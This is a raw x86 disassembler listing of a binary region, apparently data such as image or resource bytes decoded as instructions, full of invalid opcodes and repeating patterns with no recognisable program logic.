  423487:	(bad)  
  423488:	mov    eax,0xd4ffaeb4
  42348d:	ror    bh,cl
  42348f:	jmp    DWORD PTR [eax-0x40006864]
  423495:	mov    ebp,0x8e92fcba
  42349a:	mov    DWORD PTR [esi],esp
	...
  423504:	xchg   esi,eax
  423505:	xchg   ebx,eax
  423506:	(bad)  
  423507:	push   cs
  423508:	mov    esi,0xaaf0b9bc
  42350d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42350e:	mov    al,ds:0xd5dbdfff
  423513:	(bad)  
  423514:	mov    edi,0xbcffbcbf
  423519:	retf   
  42351a:	fdivr  st,st(7)
  42351c:	jns    0x4234c8
  42351e:	xlat   BYTE PTR ds:[ebx]
  42351f:	jmp    DWORD PTR [ebp-0x60]
  423522:	loope  0x423523
  423524:	inc    eax
  423525:	mov    ecx,esp
  423527:	push   DWORD PTR [edx]
  423529:	mov    dh,ah
  42352b:	jmp    FWORD PTR [eax+ecx*4]
  42352e:	jmp    0x34ff:0xeb8c2cff
  423535:	xchg   ebx,eax
  423536:	jmp    0x58ff:0xe59942ff
  42353d:	mov    al,ds:0xb38bffde
  423542:	xlat   BYTE PTR ds:[ebx]
  423543:	call   FWORD PTR [ebp-0x30004152]
  423549:	int    0xc9
  42354b:	push   DWORD PTR [ebp-0x34005e53]
  423551:	enter  0xffc5,0x87
  423555:	cmp    DWORD PTR [esi-0x37],0xffffff91
  423559:	mov    cs,WORD PTR [edx+0x1]
	...
  4235c7:	add    BYTE PTR [ebx-0x3c5b817a],cl
  4235cd:	ret    
  4235ce:	sar    edi,0x64
  4235d1:	mov    ?,WORD PTR [esi-0x2c8de001]
  4235d7:	inc    DWORD PTR [eax]
  4235d9:	imul   esp,ecx,0xffffffff
  4235dc:	add    BYTE PTR [edi-0x16],ch
  4235df:	inc    DWORD PTR [eax]
  4235e1:	ins    DWORD PTR es:[edi],dx
  4235e2:	in     eax,dx
  4235e3:	inc    DWORD PTR [eax]
  4235e5:	fs out dx,al
  4235e7:	inc    DWORD PTR [eax]
  4235e9:	imul   esi,ecx,0xffffffff
  4235ec:	add    BYTE PTR [eax-0xe],dh
  4235ef:	inc    DWORD PTR [eax]
  4235f1:	jne    0x4235e6
  4235f3:	inc    DWORD PTR [eax]
  4235f5:	jns    0x4235ec
  4235f7:	inc    DWORD PTR [eax]
  4235f9:	jl     0x4235f1
  4235fb:	inc    DWORD PTR [eax]
  4235fd:	jl     0x4235f5
  4235ff:	inc    DWORD PTR [eax]
  423601:	ja     0x4235f6
  423603:	inc    DWORD PTR [ecx]
  423605:	imul   esp,esp,0xffffffff
  423608:	and    ebp,DWORD PTR [ebx-0x35]
  42360b:	push   DWORD PTR [edi-0x6e]
  42360e:	mov    dh,0xff
  423610:	xchg   esp,eax
  423611:	nop
  423612:	mov    edi,edi
  423614:	mov    edx,0xa0b2b7
	...
  423685:	add    BYTE PTR [eax],al
  423687:	add    BYTE PTR [ebx+0x2568a1a7],ch
  42368d:	pop    esp
  42368e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42368f:	inc    DWORD PTR [eax]
  423691:	push   esi
  423692:	int    0xff
  423694:	add    BYTE PTR [eax-0x2b],ah
  423697:	inc    DWORD PTR [eax]
  423699:	imul   ebx,edi,0xffffffff
  42369c:	add    BYTE PTR [eax+ebp*8-0x1],dh
  4236a0:	add    BYTE PTR [ebp-0x14],dh
  4236a3:	inc    DWORD PTR [eax]
  4236a5:	push   0xffffffec
  4236a7:	inc    DWORD PTR [eax]
  4236a9:	outs   dx,DWORD PTR ds:[esi]
  4236aa:	out    dx,eax
  4236ab:	inc    DWORD PTR [eax]
  4236ad:	je     0x4236a0
  4236af:	inc    DWORD PTR [eax]
  4236b1:	jns    0x4236a6
  4236b3:	inc    DWORD PTR [eax]
  4236b5:	jle    0x4236aa
  4236b7:	inc    DWORD PTR [eax]
  4236b9:	xor    esp,0xf38200ff
  4236bf:	inc    DWORD PTR [eax]
  4236c1:	jns    0x4236b2
  4236c3:	inc    DWORD PTR [eax]
  4236c5:	push   0x5400ffe2
  4236ca:	sar    bh,1
  4236cc:	add    BYTE PTR [esi+edi*4-0x1],al
  4236d0:	aas    
  4236d1:	arpl   WORD PTR [esi+edi*8+0x38859199],bx
	...
  423748:	inc    eax
  423749:	gs xchg ebx,eax
  42374b:	sbb    DWORD PTR [eax],eax
  42374d:	inc    eax
  42374e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42374f:	repnz add BYTE PTR [eax-0x3a],bl
  423753:	inc    DWORD PTR [eax]
  423755:	(bad)  
  42375a:	fdivp  st(7),st
  42375c:	add    BYTE PTR [edi+eiz*8-0x1],dh
  423760:	add    BYTE PTR [edi-0x14],dh
  423763:	inc    DWORD PTR [eax]
  423765:	imul   ebp,ebp,0xffffffff
  423768:	add    BYTE PTR [edi-0x10],ch
  42376b:	inc    DWORD PTR [eax]
  42376d:	je     0x423760
  42376f:	inc    DWORD PTR [eax]
  423771:	jp     0x423766
  423773:	inc    DWORD PTR [eax]
  423775:	jg     0x42376b
  423777:	inc    DWORD PTR [eax]
  423779:	xor    esp,0xf38200ff
  42377f:	inc    DWORD PTR [eax]
  423781:	ja     0x423770
  423783:	inc    DWORD PTR [eax]
  423785:	data16 (bad) 
  423788:	add    BYTE PTR [ebp-0x35],dl
  42378b:	inc    DWORD PTR [eax]
  42378d:	inc    edi
  42378e:	mov    eax,0x9b3a03ff
  423793:	fild   WORD PTR [ebp+0x68]
  423796:	xchg   edx,eax
  423797:	or     BYTE PTR [eax],al
	...
  423809:	add    BYTE PTR [eax],al
  42380b:	add    BYTE PTR ds:0xbf9d3f,al
  423811:	push   ebx
  423812:	sar    bh,0x0
  423815:	(bad)  
  42381a:	(bad)  
  42381c:	add    BYTE PTR [ebx-0x1a],dh
  42381f:	inc    DWORD PTR [eax]
  423821:	jns    0x423810
  423823:	inc    DWORD PTR [eax]
  423825:	ins    BYTE PTR es:[edi],dx
  423826:	in     eax,dx
  423827:	inc    DWORD PTR [eax]
  423829:	outs   dx,DWORD PTR ds:[esi]
  42382a:	lock inc DWORD PTR [eax]
  42382d:	je     0x423821
  42382f:	inc    DWORD PTR [eax]
  423831:	jp     0x423826
  423833:	inc    DWORD PTR [eax]
  423835:	jg     0x42382b
  423837:	inc    DWORD PTR [eax]
  423839:	xor    ah,0xff
  42383c:	add    BYTE PTR [ecx+0x7600fff3],al
  423842:	in     eax,dx
  423843:	inc    DWORD PTR [eax]
  423845:	arpl   sp,bx
  423847:	inc    DWORD PTR [eax]
  423849:	push   ebx
  42384a:	enter  0xff,0x42
  42384e:	mov    al,0xff
  423850:	or     al,0x42
  423852:	cwde   
  423853:	popf   
	...
  4238cc:	adc    DWORD PTR [ecx-0x65],ecx
  4238cf:	je     0x4238d1
  4238d1:	dec    ebx
  4238d2:	mov    bh,0xff
  4238d4:	add    BYTE PTR [ecx-0x31],ah
  4238d7:	inc    DWORD PTR [eax]
  4238d9:	push   0xffffffdb
  4238db:	inc    DWORD PTR [eax]
  4238dd:	jae    0x4238c5
  4238df:	inc    DWORD PTR [eax]
  4238e1:	jp     0x4238d0
  4238e3:	inc    DWORD PTR [eax]
  4238e5:	ins    DWORD PTR es:[edi],dx
  4238e6:	in     eax,dx
  4238e7:	inc    DWORD PTR [eax]
  4238e9:	outs   dx,DWORD PTR ds:[esi]
  4238ea:	lock inc DWORD PTR [eax]
  4238ed:	jne    0x4238e1
  4238ef:	inc    DWORD PTR [eax]
  4238f1:	jnp    0x4238e7
  4238f3:	inc    DWORD PTR [eax]
  4238f5:	xor    ah,0xff
  4238f8:	add    BYTE PTR [ebx-0x7eff000b],al
  4238fe:	repz inc DWORD PTR [eax]
  423901:	je     0x4238ef
  423903:	inc    DWORD PTR [eax]
  423905:	popa   
  423906:	fcos   
  423908:	add    BYTE PTR [eax-0x3c],dl
  42390b:	inc    DWORD PTR [eax]
  42390d:	cmp    eax,0x4e18ffa8
  423912:	cdq    
  423913:	push   edx
	...
  42398c:	sbb    BYTE PTR [eax-0x67],dl
  42398f:	add    BYTE PTR cs:[ebp+ebp*4-0x5],al
  423994:	add    BYTE PTR [eax-0x33],ah
  423997:	inc    DWORD PTR [eax]
  423999:	imul   ebx,edx,0xe57300ff
  42399f:	inc    DWORD PTR [eax]
  4239a1:	jnp    0x423990
  4239a3:	inc    DWORD PTR [eax]
  4239a5:	outs   dx,DWORD PTR ds:[esi]
  4239a6:	in     eax,dx
  4239a7:	inc    DWORD PTR [eax]
  4239a9:	outs   dx,DWORD PTR ds:[esi]
  4239aa:	lock inc DWORD PTR [eax]
  4239ad:	jne    0x4239a1
  4239af:	inc    DWORD PTR [eax]
  4239b1:	jl     0x4239a7
  4239b3:	inc    DWORD PTR [eax]
  4239b5:	xor    ebp,0xf58400ff
  4239bb:	inc    DWORD PTR [eax]
  4239bd:	xor    ebx,0xea7200ff
  4239c3:	inc    DWORD PTR [eax]
  4239c5:	pop    ebp
  4239c6:	aad    0xff
  4239c8:	add    BYTE PTR [ebp-0x41],cl
  4239cb:	inc    DWORD PTR [ecx]
  4239cd:	cmp    al,0xa0
  4239cf:	in     eax,dx
  4239d0:	pop    ss
  4239d1:	dec    edi
  4239d2:	xchg   esi,eax
  4239d3:	adc    al,0x0
	...
  423a49:	add    BYTE PTR [eax],al
  423a4b:	add    BYTE PTR [esi+edx*2],bl
  423a4e:	cdq    
  423a4f:	add    eax,DWORD PTR ds:0xd2a443
  423a55:	pop    edx
  423a56:	enter  0xff,0x68
  423a5a:	fdivr  st,st(7)
  423a5c:	add    BYTE PTR [ecx-0x1c],dh
  423a5f:	inc    DWORD PTR [eax]
  423a61:	jl     0x423a50
  423a63:	inc    DWORD PTR [eax]
  423a65:	jo     0x423a55
  423a67:	inc    DWORD PTR [eax]
  423a69:	outs   dx,DWORD PTR ds:[esi]
  423a6a:	lock inc DWORD PTR [eax]
  423a6d:	jbe    0x423a62
  423a6f:	inc    DWORD PTR [eax]
  423a71:	jl     0x423a67
  423a73:	inc    DWORD PTR [eax]
  423a75:	xor    ebp,0xf58400ff
  423a7b:	inc    DWORD PTR [eax]
  423a7d:	xor    dl,0xff
  423a80:	add    BYTE PTR [edi-0x19],ch
  423a83:	inc    DWORD PTR [eax]
  423a85:	pop    edx
  423a86:	sar    edi,1
  423a88:	add    BYTE PTR [eax-0x47],cl
  423a8b:	dec    DWORD PTR [eax]
  423a8d:	inc    eax
  423a8e:	pushf  
  423a8f:	mov    bh,0x0
	...
  423b0d:	add    BYTE PTR [eax],al
  423b0f:	add    BYTE PTR [esi],cl
  423b11:	inc    edi
  423b12:	sahf   
  423b13:	xchg   ecx,eax
  423b14:	add    BYTE PTR [edx-0x41],dl
  423b17:	inc    DWORD PTR [eax]
  423b19:	push   0x7100ffd6
  423b1e:	jecxz  0x423b1f
  423b20:	add    BYTE PTR [ebx-0x14],bh
  423b23:	inc    DWORD PTR [eax]
  423b25:	jno    0x423b16
  423b27:	inc    DWORD PTR [eax]
  423b29:	imul   esi,ecx,0xffffffff
  423b2c:	add    BYTE PTR [edx-0xc],dh
  423b2f:	inc    DWORD PTR [eax]
  423b31:	jns    0x423b28
  423b33:	inc    DWORD PTR [eax]
  423b35:	jg     0x423b2e
  423b37:	inc    DWORD PTR [eax]
  423b39:	xor    esi,0xffffffff
  423b3c:	add    BYTE PTR [edi-0xe],bh
  423b3f:	inc    DWORD PTR [eax]
  423b41:	imul   esp,esp,0xffffffff
  423b44:	add    BYTE PTR [edi-0x32],dl
  423b47:	inc    DWORD PTR [eax]
  423b49:	inc    edx
  423b4a:	mov    al,0xff
  423b4c:	adc    ecx,DWORD PTR [ecx-0x67]
  423b4f:	outs   dx,BYTE PTR ds:[esi]
	...
  423bd0:	adc    al,0x4d
  423bd2:	call   0xff:0xb54a0045
  423bd9:	popa   
  423bda:	aad    0xff
  423bdc:	add    BYTE PTR [ebp-0x1d],ch
  423bdf:	inc    DWORD PTR [edi+edi*2]
  423be2:	in     al,dx
  423be3:	call   DWORD PTR [esi]
  423be5:	sub    esp,0xeb8023ff
  423beb:	jmp    FWORD PTR [ebx]
  423bed:	mov    ebp,ebp
  423bef:	jmp    FWORD PTR [edx]
  423bf1:	(bad)  
  423bf2:	out    dx,al
  423bf3:	jmp    DWORD PTR [edx]
  423bf5:	(bad)  
  423bf6:	out    dx,eax
  423bf7:	call   DWORD PTR [esp+ecx*4]
  423bfa:	icebp  
  423bfb:	inc    DWORD PTR [ecx]
  423bfd:	jge    0x423bf0
  423bff:	inc    DWORD PTR [eax]
  423c01:	arpl   bx,sp
  423c03:	inc    DWORD PTR [eax]
  423c05:	push   eax
  423c06:	retf   0xff
  423c09:	aas    
  423c0a:	test   al,0xfa
  423c0c:	pop    ss
  423c0d:	dec    edi
  423c0e:	xchg   edi,eax
  423c0f:	sub    BYTE PTR [eax],al
	...
  423c8d:	add    BYTE PTR [eax],al
  423c8f:	add    BYTE PTR [ecx],dl
  423c91:	dec    ebp
  423c92:	cwde   
  423c93:	push   cs
  423c94:	add    eax,DWORD PTR [ebp-0x57]
  423c97:	out    0x6f,al
  423c99:	lahf   
  423c9a:	aam    0xff
  423c9c:	lea    ebp,[edi-0x1e260033]
  423ca2:	out    0xff,eax
  423ca4:	into   
  423ca5:	rcl    dl,cl
  423ca7:	(bad)  
  423ca8:	jmp    0xd3d9:0xddffe6e9
  423caf:	(bad)  
  423cb0:	in     eax,dx
  423cb1:	jmp    0x423c9b
  423cb3:	(bad)  
  423cb4:	fcom   st(6)
  423cb6:	sar    bh,1
  423cb8:	(bad)  
  423cba:	loop   0x423cbb
  423cbc:	stos   BYTE PTR es:[edi],al
  423cbd:	mov    edx,0xb69dffc8
  423cc2:	sar    edi,1
  423cc4:	xor    ebp,DWORD PTR [edx-0x47]
  423cc7:	inc    DWORD PTR [edx]
  423cc9:	mov    al,ds:0x9b5315cc
  423ccf:	add    al,BYTE PTR [eax]
	...
  423d51:	add    BYTE PTR [eax],al
  423d53:	add    BYTE PTR [ebp-0x404c576b],al
  423d59:	mov    dh,0xaa
  423d5b:	(bad)  
  423d5c:	jmp    0xdc421c45
  423d61:	aam    0xcc
  423d63:	(bad)  
  423d64:	in     al,dx
  423d65:	jmp    0xffcf:0xd5daffe7
  423d6c:	in     eax,dx
  423d6d:	jmp    0x423d57
  423d6f:	(bad)  
  423d70:	fstp   st(1)
  423d72:	sar    edi,cl
  423d74:	jmp    0x423d5f
  423d76:	out    0xff,al
  423d78:	(bad)  
  423d79:	ror    al,1
  423d7b:	jmp    esi
  423d7d:	loope  0x423d5b
  423d7f:	inc    esi
  423d81:	mov    esp,0xced3ffaf
  423d86:	enter  0x5aff,0x72
  423d8a:	nop
  423d8b:	test   DWORD PTR [eax],eax
	...
  423e11:	add    BYTE PTR [eax],al
  423e13:	add    BYTE PTR [ecx-0x2e9f7e76],dl
  423e19:	iret   
  423e1a:	int3   
  423e1b:	dec    ecx
  423e1d:	mov    al,0xff
  423e20:	call   0xdb42230c
  423e25:	xlat   BYTE PTR ds:[ebx]
  423e26:	sar    edi,cl
  423e28:	jmp    0x423e13
  423e2a:	out    0xff,al
  423e2c:	(bad)  
  423e2e:	sar    edi,cl
  423e30:	in     al,dx
  423e31:	jmp    0xffd0:0xd5d8ffe8
  423e38:	out    0xe5,eax
  423e3a:	loop   0x423e3b
  423e3c:	enter  0xbdc3,0xff
  423e40:	(bad)  
  423e42:	aam    0xff
  423e44:	popf   
  423e45:	cwde   
  423e46:	xchg   ecx,eax
  423e47:	(bad)  
  423e48:	mov    bh,0xb3
  423e4a:	lods   al,BYTE PTR ds:[esi]
  423e4b:	dec    esi
	...
  423ed4:	xchg   edi,eax
  423ed5:	xchg   esp,eax
  423ed6:	mov    fs,WORD PTR [ecx]
  423ed8:	sahf   
  423ed9:	call   0xffdc:0xdfe0f494
  423ee0:	rcl    eax,cl
  423ee2:	retf   
  423ee3:	(bad)  
  423ee4:	jmp    0x423ed0
  423ee6:	out    0xff,eax
  423ee8:	fcom   st(5)
  423eea:	sar    bh,1
  423eec:	in     al,dx
  423eed:	jmp    0xffd3:0xd8dcffe8
  423ef4:	jmp    0xc8ce:0xd2ffe6e8
  423efb:	jmp    ecx
  423efd:	(bad)  
  423eff:	push   DWORD PTR [ebx-0x3a005751]
  423f05:	ret    
  423f06:	mov    edi,0x92979ced
  423f0b:	or     DWORD PTR [eax],eax
	...
  423f95:	add    BYTE PTR [eax],al
  423f97:	add    cl,al
  423f99:	mov    edi,0xbcbfd7bb
  423f9e:	mov    dh,0xff
  423fa0:	out    0xe5,eax
  423fa2:	loop   0x423fa3
  423fa4:	fcmovbe st,st(7)
  423fa6:	sar    bh,cl
  423fa8:	jmp    0x423f93
  423faa:	out    0xff,al
  423fac:	(bad)  
  423fae:	aam    0xff
  423fb0:	in     al,dx
  423fb1:	jmp    0x423f9b
  423fb3:	(bad)  
  423fb4:	fcom   st(4)
  423fb6:	iret   
  423fb7:	jmp    esi
  423fb9:	in     al,0xe1
  423fbb:	inc    ebx
  423fbd:	mov    edi,0xd1d4ffb9
  423fc2:	into   
  423fc3:	call   DWORD PTR [ecx+0xa0878c]
	...
  424055:	add    BYTE PTR [eax],al
  424057:	add    BYTE PTR [edx-0x27897873],dl
  42405d:	(bad)  
  42405e:	sar    edi,cl
  424060:	ror    ch,1
  424062:	enter  0xebff,0xea
  424066:	call   0xd2191b6a
  42406b:	(bad)  
  42406c:	in     al,dx
  42406d:	jmp    0x424057
  42406f:	(bad)  
  424070:	(bad)  
  424072:	aam    0xff
  424074:	jmp    0xc6cc:0xd0ffe6e9
  42407b:	(bad)  
  42407c:	(bad)  
  42407e:	fdivr  st,st(7)
  424080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424081:	mov    al,ds:0xb7baff99
  424086:	mov    bl,0x70
	...
  424118:	stos   BYTE PTR es:[edi],al
  424119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42411a:	mov    ds:0x9ea4a83f,al
  42411f:	(bad)  
  424120:	in     eax,0xe3
  424122:	loope  0x424123
  424124:	(bad)  
  424126:	sar    bh,cl
  424128:	jmp    0x424114
  42412a:	out    0xff,eax
  42412c:	(bad)  
  42412e:	aam    0xff
  424130:	in     al,dx
  424131:	jmp    0xffcf:0xd5d8ffe8
  424138:	out    0xe3,al
  42413a:	loopne 0x42413b
  42413c:	mov    esp,0xcaffb1b7
  424141:	mov    esp,0x878c90f5
  424147:	push   ss
	...
  4241d8:	xchg   ebx,eax
  4241d9:	(bad)
  4241dd:	mov    dl,0xe8
  4241e0:	retf   
  4241e1:	mov    eax,0xe6eaefff
  4241e7:	jmp    ebp
  4241e9:	(bad)  
  4241eb:	push   edx
  4241ed:	out    dx,al
  4241ee:	out    0xff,eax
  4241f0:	call   0xf14214d2
  4241f5:	jmp    0xffc0:0xcbd3ffe4
  4241fc:	fcmovbe st,st(7)
  4241fe:	sar    edi,cl
  424200:	cwde   
  424201:	xchg   esp,eax
  424202:	mov    ?,WORD PTR [eax+0x0]
	...
  42429c:	popf   
  42429d:	xchg   ebp,eax
  42429e:	mov    edx,DWORD PTR [ebx-0x252527]
  4242a4:	lods   al,BYTE PTR ds:[esi]
  4242a5:	(bad)
  4242a8:	enter  0xecdc,0xff
  4242ac:	(bad)  
  4242ad:	mov    bh,0xdf
  4242af:	inc    esp
  4242b1:	fucomi st,st(7)
  4242b3:	call   DWORD PTR [edi-0x30002543]
  4242b9:	(bad)  
  4242bb:	jmp    FWORD PTR [edx-0x41005957]
  4242c1:	mov    ecx,0x8fb2
	...
  42435a:	add    BYTE PTR [eax],al
  42435c:	pop    esp
  42435d:	ja     0x4242f9
  42435f:	dec    esp
  424360:	adc    al,0x68
  424362:	(bad)  
  424363:	inc    DWORD PTR [eax]
  424365:	jge    0x424351
  424367:	inc    DWORD PTR [eax]
  424369:	jne    0x42435d
  42436b:	inc    DWORD PTR [eax]
  42436d:	outs   dx,BYTE PTR ds:[esi]
  42436e:	cmc    
  42436f:	inc    DWORD PTR [eax]
  424371:	jl     0x42436b
  424373:	inc    DWORD PTR [eax]
  424375:	cmp    eax,0xffffffff
  424378:	add    BYTE PTR [ecx-0x17],dh
  42437b:	call   FWORD PTR [ecx]
  42437d:	pop    edx
  42437e:	mov    eax,0x95765cfb
  424383:	sub    al,BYTE PTR [eax]
	...
  424419:	add    BYTE PTR [eax],al
  42441b:	add    BYTE PTR ds:0x109f52,dl
  424421:	push   ecx
  424422:	mov    esp,0xe67800eb
  424427:	inc    DWORD PTR [eax]
  424429:	jp     0x42441b
  42442b:	inc    DWORD PTR [eax]
  42442d:	je     0x424422
  42442f:	inc    DWORD PTR [eax]
  424431:	xor    dh,0xff
  424434:	add    BYTE PTR [esi+0x6900fff6],al
  42443a:	jecxz  0x42443b
  42443c:	add    DWORD PTR [eax-0x4f],ecx
  42443f:	into   
  424440:	sbb    ebx,DWORD PTR [edx-0x5f]
  424443:	add    eax,DWORD PTR [eax]
	...
  4244dd:	add    BYTE PTR [eax],al
  4244df:	add    BYTE PTR [edx],cl
  4244e1:	dec    edi
  4244e2:	scas   al,BYTE PTR es:[edi]
  4244e3:	scas   eax,DWORD PTR es:[edi]
  4244e4:	add    BYTE PTR [edx-0x20],dh
  4244e7:	inc    DWORD PTR [eax]
  4244e9:	jge    0x4244db
  4244eb:	inc    DWORD PTR [eax]
  4244ed:	je     0x4244e2
  4244ef:	inc    DWORD PTR [eax]
  4244f1:	xor    esi,0xf58400ff
  4244f7:	inc    DWORD PTR [eax]
  4244f9:	pusha  
  4244fa:	fcos   
  4244fc:	or     al,0x4c
  4244fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244ff:	mov    BYTE PTR [eax],al
	...
  42459d:	add    BYTE PTR [eax],al
  42459f:	add    BYTE PTR [esi],cl
  4245a1:	dec    ebp
  4245a2:	mov    ds:0xd7690062,eax
  4245a7:	inc    DWORD PTR [eax]
  4245a9:	jle    0x42459b
  4245ab:	inc    DWORD PTR [eax]
  4245ad:	je     0x4245a2
  4245af:	inc    DWORD PTR [eax]
  4245b1:	xor    bh,0xff
  4245b4:	add    BYTE PTR [ecx+0x5600fff4],al
  4245ba:	int3   
  4245bb:	call   DWORD PTR [edx]
  4245bd:	dec    edi
  4245be:	lahf   
  4245bf:	inc    ebx
	...
  424660:	and    esp,DWORD PTR [ecx-0x59]
  424663:	sbb    eax,0xf5cb6002
  424668:	add    BYTE PTR [edi-0x10],bh
  42466b:	inc    DWORD PTR [eax]
  42466d:	ja     0x424663
  42466f:	inc    DWORD PTR [eax]
  424671:	test   ecx,edi
  424673:	inc    DWORD PTR [eax]
  424675:	jge    0x424669
  424677:	inc    DWORD PTR [ebx]
  424679:	push   ecx
  42467a:	mov    esi,0xa15a1ae2
  42467f:	or     al,BYTE PTR [eax]
	...
  424721:	add    BYTE PTR [eax],al
  424723:	add    BYTE PTR [edi],al
  424725:	pop    ecx
  424726:	mov    esi,0xeb6f00ae
  42472b:	inc    DWORD PTR [eax]
  42472d:	ja     0x424722
  42472f:	inc    DWORD PTR [eax]
  424731:	test   esi,esi
  424733:	inc    DWORD PTR [eax]
  424735:	jae    0x424721
  424737:	inc    DWORD PTR [esi]
  424739:	push   eax
  42473a:	mov    bl,0x88
	...
  4247e4:	sbb    al,0x63
  4247e6:	mov    edx,0xc5560319
  4247eb:	ja     0x4247ee
  4247ed:	pop    edx
  4247ee:	enter  0x297,0x59
  4247f2:	(bad)  
  4247f3:	xchg   ebp,eax
  4247f4:	add    eax,0x186ec156
  4247f9:	imul   edi,DWORD PTR [ebx+0xd],0x0
	...
  424910:	(bad)  
  424911:	(bad)  
  424912:	(bad)  
  424913:	(bad)  
  424914:	(bad)  
  424915:	inc    DWORD PTR [eax]
  424917:	add    al,dh
  424919:	add    BYTE PTR [eax],al
  42491b:	add    BYTE PTR [eax],al
  42491d:	sldt   WORD PTR [eax]
  424920:	lock add BYTE PTR [eax],al
  424923:	add    BYTE PTR [eax],al
  424925:	sldt   WORD PTR [eax]
  424928:	lock add BYTE PTR [eax],al
  42492b:	add    BYTE PTR [eax],al
  42492d:	sldt   WORD PTR [eax]
  424930:	lock add BYTE PTR [eax],al
  424933:	add    BYTE PTR [eax],al
  424935:	sldt   WORD PTR [eax]
  424938:	lock add BYTE PTR [eax],al
  42493b:	add    BYTE PTR [eax],al
  42493d:	sldt   WORD PTR [eax]
  424940:	lock add BYTE PTR [eax],al
  424943:	add    BYTE PTR [eax],al
  424945:	sldt   WORD PTR [eax]
  424948:	clc    
  424949:	add    BYTE PTR [eax],al
  42494b:	add    BYTE PTR [eax],al
  42494d:	pop    ds
  42494e:	add    BYTE PTR [eax],al
  424950:	clc    
  424951:	add    BYTE PTR [eax],al
  424953:	add    BYTE PTR [eax],al
  424955:	pop    ds
  424956:	add    BYTE PTR [eax],al
  424958:	clc    
  424959:	add    BYTE PTR [eax],al
  42495b:	add    BYTE PTR [eax],al
  42495d:	pop    ds
  42495e:	add    BYTE PTR [eax],al
  424960:	cld    
  424961:	add    BYTE PTR [eax],al
  424963:	add    BYTE PTR [eax],al
  424965:	aas    
  424966:	add    BYTE PTR [eax],al
  424968:	cld    
  424969:	add    BYTE PTR [eax],al
  42496b:	add    BYTE PTR [eax],al
  42496d:	aas    
  42496e:	add    BYTE PTR [eax],al
  424970:	cld    
  424971:	add    BYTE PTR [eax],al
  424973:	add    BYTE PTR [eax],al
  424975:	aas    
  424976:	add    BYTE PTR [eax],al
  424978:	cld    
  424979:	add    BYTE PTR [eax],al
  42497b:	add    BYTE PTR [eax],al
  42497d:	jg     0x42497f
  42497f:	add    dh,bh
  424981:	add    BYTE PTR [eax],al
  424983:	add    BYTE PTR [eax],al
  424985:	jg     0x424987
  424987:	add    dh,bh
  424989:	add    BYTE PTR [eax],al
  42498b:	add    BYTE PTR [eax],al
  42498d:	jg     0x42498f
  42498f:	add    dh,bh
  424991:	add    BYTE PTR [eax],al
  424993:	add    BYTE PTR [eax],al
  424995:	inc    DWORD PTR [eax]
  424997:	add    bh,bh
  424999:	add    BYTE PTR [eax],al
  42499b:	add    BYTE PTR [eax],al
  42499d:	inc    DWORD PTR [eax]
  42499f:	add    bh,bh
  4249a1:	add    BYTE PTR [eax],al
  4249a3:	add    BYTE PTR [eax],al
  4249a5:	inc    DWORD PTR [eax]
  4249a7:	add    bh,bh
  4249a9:	clc    
  4249aa:	add    BYTE PTR [eax],al
  4249ac:	pop    ds
  4249ad:	inc    DWORD PTR [eax]
  4249af:	add    bh,bh
  4249b1:	clc    
  4249b2:	add    BYTE PTR [eax],al
  4249b4:	pop    ds
  4249b5:	inc    DWORD PTR [eax]
  4249b7:	add    bh,bh
  4249b9:	clc    
  4249ba:	add    BYTE PTR [eax],al
  4249bc:	pop    ds
  4249bd:	inc    DWORD PTR [eax]
  4249bf:	add    bh,bh
  4249c1:	cld    
  4249c2:	add    BYTE PTR [eax],al
  4249c4:	aas    
  4249c5:	inc    DWORD PTR [eax]
  4249c7:	add    bh,bh
  4249c9:	cld    
  4249ca:	add    BYTE PTR [eax],al
  4249cc:	aas    
  4249cd:	inc    DWORD PTR [eax]
  4249cf:	add    bh,bh
  4249d1:	cld    
  4249d2:	add    BYTE PTR [eax],al
  4249d4:	aas    
  4249d5:	inc    DWORD PTR [eax]
  4249d7:	add    bh,bh
  4249d9:	inc    BYTE PTR [eax]
  4249db:	add    BYTE PTR [edi-0x1],bh
  4249de:	add    BYTE PTR [eax],al
  4249e0:	(bad)  
  4249e1:	inc    BYTE PTR [eax]
  4249e3:	add    BYTE PTR [edi-0x1],bh
  4249e6:	add    BYTE PTR [eax],al
  4249e8:	(bad)  
  4249e9:	inc    BYTE PTR [eax]
  4249eb:	add    BYTE PTR [edi-0x1],bh
  4249ee:	add    BYTE PTR [eax],al
  4249f0:	(bad)  
  4249f1:	inc    BYTE PTR [eax]
  4249f3:	add    bh,bh
  4249f5:	inc    DWORD PTR [eax]
  4249f7:	add    bh,bh
  4249f9:	inc    DWORD PTR [eax]
  4249fb:	add    bh,bh
  4249fd:	inc    DWORD PTR [eax]
  4249ff:	add    bh,bh
  424a01:	inc    DWORD PTR [eax]
  424a03:	add    bh,bh
  424a05:	inc    DWORD PTR [eax]
  424a07:	add    bh,bh
  424a09:	inc    DWORD PTR [eax]
  424a0b:	add    bh,bh
  424a0d:	inc    DWORD PTR [eax]
  424a0f:	add    bh,bh
  424a11:	inc    DWORD PTR [eax+0xffff01]
  424a17:	add    bh,bh
  424a19:	inc    DWORD PTR [eax+0xffff01]
  424a1f:	add    bh,bh
  424a21:	inc    DWORD PTR [eax+0xffff01]
  424a27:	add    bh,bh
  424a29:	inc    eax
  424a2b:	add    edi,edi
  424a2d:	inc    DWORD PTR [eax]
  424a2f:	add    bh,bh
  424a31:	inc    eax
  424a33:	add    edi,edi
  424a35:	inc    DWORD PTR [eax]
  424a37:	add    bh,bh
  424a39:	inc    eax
  424a3b:	add    edi,edi
  424a3d:	inc    DWORD PTR [eax]
  424a3f:	add    bh,bh
  424a41:	inc    eax
  424a43:	pop    es
  424a44:	(bad)  
  424a45:	inc    DWORD PTR [eax]
  424a47:	add    bh,bh
  424a49:	jmp    eax
  424a4b:	pop    es
  424a4c:	(bad)  
  424a4d:	inc    DWORD PTR [eax]
  424a4f:	add    bh,bh
  424a51:	jmp    eax
  424a53:	pop    es
  424a54:	(bad)  
  424a55:	inc    DWORD PTR [eax]
  424a57:	add    bh,bh
  424a59:	jmp    eax
  424a5b:	pop    es
  424a5c:	(bad)  
  424a5d:	inc    DWORD PTR [eax]
  424a5f:	add    bh,bh
  424a61:	push   eax
  424a63:	ud0    edi,edi
  424a66:	add    BYTE PTR [eax],al
  424a68:	(bad)  
  424a69:	push   eax
